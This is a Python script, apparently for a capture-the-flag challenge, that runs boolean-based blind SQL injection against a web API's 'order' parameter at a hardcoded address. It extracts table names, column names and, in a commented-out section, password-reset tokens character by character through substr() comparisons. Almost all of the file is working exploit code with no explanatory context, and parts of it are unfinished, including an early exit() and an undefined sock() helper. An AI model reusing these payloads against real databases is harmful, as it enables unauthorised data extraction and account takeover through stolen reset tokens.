import json
import string
import os
from tqdm import tqdm
import requests

def send(query):
    data = {
        "order":query
    }
    r = requests.post("http://139.59.168.47:31351/api/list", json=data)
    print(r.text)
    return not "wrong" in r.text

# Leaking name of the table
try:
    complete = ""
    for i in range(5, 11):
        old = complete
        for s in tqdm(string.printable):
            #pay = "(substr(database(),"+str(i)+",1)='"+s+"')"
            pay = "(substr((SELECT table_name FROM information_schema.tables WHERE table_name LIKE 'flag%'),"+str(i)+",1)='"+s+"')" 
            # id, name, base_price, current_price, available
            #pay = "(substr((SELECT column_name FROM information_schema.columns WHERE table_schema = 'employees' and table_name = 'employees' limit "+str(n)+",1),"+str(i)+",1)='"+s+"')"
            #pay = "(substr((SELECT current_price FROM membership_plans limit "+str(n)+",1),"+str(i)+",1)='"+s+"')"
            print(pay)
            exit()
            if send(pay):
                complete += s
                break

        print(complete)
        if complete == old+" ":
            complete = old
            break
except:
    pass

"""
columns = []
for n in range(1, 5):
    try:
        complete = ""
        for i in range(1, 20):
            old = complete
            for s in tqdm(string.printable):
                #pay = "(substr(database(),"+str(i)+",1)='"+s+"')"
                #pay = "(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = 'employees' limit 1),"+str(i)+",1)='"+s+"')" # membership_plans, employees
                # id, name, base_price, current_price, available
                pay = "(substr((SELECT column_name FROM information_schema.columns WHERE table_schema = 'employees' and table_name = 'password_reset' limit "+str(n)+",1),"+str(i)+",1)='"+s+"')"
                #pay = "(substr((SELECT current_price FROM membership_plans limit "+str(n)+",1),"+str(i)+",1)='"+s+"')"
                r = asyncio.get_event_loop().run_until_complete(sock(pay))
                if "sorry" not in r:
                    complete += s
                    print(s)
                    break
            print(complete)
            if complete == old+" ":
                complete = old
                break
        columns.append(complete)
    except:
        pass

print(columns)



columns = ['token', 'expires']#['password', 'username', 'email']#['username', 'password', 'email']
print(columns)
results = {}
for c in columns:
    results[c] = []


for n in range(5):
    try:
        for c in columns:
            print(c)
            complete = ""
            for i in range(1, 65):
                old = complete
                pbar = tqdm(string.printable, desc="Found: ")
                for s in pbar:
                    #pay = "(substr(database(),"+str(i)+",1)='"+s+"')"
                    #pay = "(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = 'employees' limit 1),"+str(i)+",1)='"+s+"')" # membership_plans, employees
                    # id, name, base_price, current_price, available
                    pay = "(substr((SELECT "+c+" FROM employees.password_reset limit "+str(n)+",1),"+str(i)+",1)='"+s+"')"
                    #pay = "(substr((SELECT current_price FROM membership_plans limit "+str(n)+",1),"+str(i)+",1)='"+s+"')"
                    r = asyncio.get_event_loop().run_until_complete(sock(pay))
                    if "sorry" not in r:
                        complete += s
                        #print(s)
                        pbar.set_description("Found: "+complete)
                        break
                #print(complete)
                if complete == old+" ":
                    break

            results[c].append(complete)
    except:
        break

print(results)


complete = ""
for i in range(1, 20):
    for s in tqdm(string.printable):
        #pay = "(substr(database(),"+str(i)+",1)='"+s+"')"
        pay = "(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = 'employees'),"+str(i)+",1)='"+s+"')" # membership_plans
        # id, name, base_price, current_price, available
        #pay = "(substr((SELECT column_name FROM information_schema.columns WHERE table_schema = 'crossfit' and table_name = 'membership_plans' limit 5,1),"+str(i)+",1)='"+s+"')"
        pay = "(substr((show databases),"+str(i)+",1)='"+s+"')"
        r = asyncio.get_event_loop().run_until_complete(sock(pay))
        if "sorry" not in r:
            complete += s
            print(s)
            break

    print(complete)
"""